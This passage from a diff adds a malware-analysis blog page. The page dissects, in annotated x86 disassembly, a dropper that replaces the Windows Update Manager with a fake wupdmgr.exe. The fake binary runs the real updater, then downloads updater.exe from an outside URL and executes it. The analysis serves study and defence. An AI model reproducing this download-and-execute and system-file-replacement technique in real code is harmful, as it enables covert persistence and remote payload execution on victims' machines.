+<span class="err">0</span><span class="nf">x004012DE</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hResInfo</span>
+<span class="err">0</span><span class="nf">x004012DF</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hModule</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004012E2</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; hModule</span>
+<span class="err">0</span><span class="nf">x004012E3</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nb">Si</span><span class="nv">zeofResource</span>
+<span class="err">0</span><span class="nf">x004012E9</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">nNumberOfBytesToWrite</span><span class="p">],</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>Then, a new file is created to <strong>C:\Windows\system32\wupdmgr.exe</strong> (former path of the original Windows Update Manager):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004012EF</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; hTemplateFile</span>
+<span class="err">0</span><span class="nf">x004012F1</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; dwFlagsAndAttributes</span>
+<span class="err">0</span><span class="nf">x004012F3</span>    <span class="nv">push</span>    <span class="nv">CREATE_ALWAYS</span>   <span class="c1">; dwCreationDisposition</span>
+<span class="err">0</span><span class="nf">x004012F5</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpSecurityAttributes</span>
+<span class="err">0</span><span class="nf">x004012F7</span>    <span class="nv">push</span>    <span class="nv">FILE_SHARE_READ</span> <span class="c1">; dwShareMode</span>
+<span class="err">0</span><span class="nf">x004012F9</span>    <span class="nv">push</span>    <span class="nv">GENERIC_WRITE</span>   <span class="c1">; dwDesiredAccess</span>
+<span class="err">0</span><span class="nf">x004012FE</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">fake_wupdmgr_path</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401304</span>    <span class="nv">push</span>    <span class="nb">edx</span>            <span class="c1">; C:\Windows\system32\wupdmgr.exe</span>
+<span class="err">0</span><span class="nf">x00401305</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CreateFileA</span>  <span class="c1">; create new empty file</span>
+<span class="err">0</span><span class="nf">x0040130B</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hFile</span><span class="p">],</span> <span class="nb">eax</span>
+</code></pre></div></div>
+<p>Finally, the content of the resource is written to this new file, and it is executed:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401311</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpOverlapped</span>
+<span class="err">0</span><span class="nf">x00401313</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">NumberOfBytesWritten</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401316</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpNumberOfBytesWritten</span>
+<span class="err">0</span><span class="nf">x00401317</span>    <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">nNumberOfBytesToWrite</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040131D</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; size of resource</span>
+<span class="err">0</span><span class="nf">x0040131E</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpBuffer</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401321</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; resource data</span>
+<span class="err">0</span><span class="nf">x00401322</span>    <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hFile</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401328</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFile (empty wupdmgr.exe)</span>
+<span class="err">0</span><span class="nf">x00401329</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WriteFile</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040133C</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; uCmdShow</span>
+<span class="err">0</span><span class="nf">x0040133E</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">fake_wupdmgr_path</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00401344</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpCmdLine</span>
+<span class="err">0</span><span class="nf">x00401345</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WinExec</span> <span class="c1">; C:\Windows\system32\wupdmgr.exe</span>
+</code></pre></div></div>
+
+<h2 id="fake_updater">The fake Windows Update Manager</h2>
+
+<p>The fake updater starts by executing the real one (from the /tmp directory):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004010A8</span>    <span class="nv">push</span>    <span class="mi">5</span>               <span class="c1">; uCmdShow</span>
+<span class="err">0</span><span class="nf">x004010AA</span>    <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">path_to_temp_winup</span><span class="p">]</span> <span class="c1">; original update manager</span>
+<span class="err">0</span><span class="nf">x004010B0</span>    <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpCmdLine: %TEMP%\winup.exe</span>
+<span class="err">0</span><span class="nf">x004010B1</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WinExec</span>
+</code></pre></div></div>
+<p>Then, it downloads a new binary from the URL <strong>http://www.practicalmalwareanalysis.com/updater.exe</strong> and saves it to the patth <strong>C:\Windows\system32\wupdmgrd.exe</strong>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x004010EF</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; LPBINDSTATUSCALLBACK</span>
+<span class="err">0</span><span class="nf">x004010F1</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; DWORD</span>
+<span class="err">0</span><span class="nf">x004010F3</span>    <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">path_to_sys32_wupdmgrd</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x004010F9</span>    <span class="nv">push</span>    <span class="nb">ecx</span>         <span class="c1">; C:\Windows\system32\wupdmgrd.exe</span>
+<span class="err">0</span><span class="nf">x004010FA</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">URL</span>  <span class="c1">; "http://www.practical"...</span>
+<span class="err">0</span><span class="nf">x004010FF</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; LPUNKNOWN</span>
+<span class="err">0</span><span class="nf">x00401101</span>    <span class="nv">call</span>    <span class="nv">URLDownloadToFileA</span>
+</code></pre></div></div>
+<p>And finally the downloaded payload is executed:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00401117</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">path_to_sys32_wupdmgrd</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0040111D</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpCmdLine</span>
+<span class="err">0</span><span class="nf">x0040111E</span>    <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">WinExec</span>      <span class="c1">; execute downloaded payload</span>
+</code></pre></div></div>
+<p>I tried to wget the URL but it returned a 404.</p>
+
+<hr />
+<p>end of file</p>
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
